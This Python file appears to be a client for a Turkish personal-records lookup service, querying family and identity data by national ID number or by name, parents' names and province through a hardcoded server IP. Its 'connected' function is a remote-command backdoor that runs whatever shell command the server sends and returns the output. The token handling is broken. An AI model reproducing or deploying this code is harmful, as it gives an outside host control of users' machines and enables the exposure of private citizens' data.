import socket
import json
import subprocess

def token(token):
    token = token

def create_socket():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('87.248.157.112', 65432))  # Sunucu IP ve portunu ayarla
    return client_socket

def connected():
    client_socket = create_socket()
    
    request_data = "Ready"
    client_socket.send(request_data.encode())
    
    response = client_socket.recv(1024).decode()
    response_data = json.loads(response)

    if response_data == {"server": "Ready"}:
        return "Ready"
    elif "command" in response_data:
        command = response_data["command"]
        if command:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            # stdout ve stderr'i birleştir ve decode et
            output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')

            # Veriyi parça parça gönder
            chunk_size = 1024  # Her parçada gönderilecek veri miktarı
            for i in range(0, len(output), chunk_size):
                client_socket.send(output[i:i + chunk_size].encode())
            return "Ready"
    client_socket.close()


def send_request(command, *args):
    client_socket = create_socket()
    
    request_data = f"{command}|" + "|".join(args)
    client_socket.send(request_data.encode())
    
    response = client_socket.recv(1024).decode()
    client_socket.close()
    
    try:
        return json.loads(response)
    except json.JSONDecodeError as e:
        return {"error": "Lütfen Daha Falza Bilgi Verin"}

def tumaile(tc):
    return send_request("tumaile", tc, token)

def aile(tc):
    return send_request("aile", tc, token)

def kisi(ad, soyad, annead, babaad, il, ilce):
    return send_request("kisi", ad, soyad, annead, babaad, il, ilce, token)

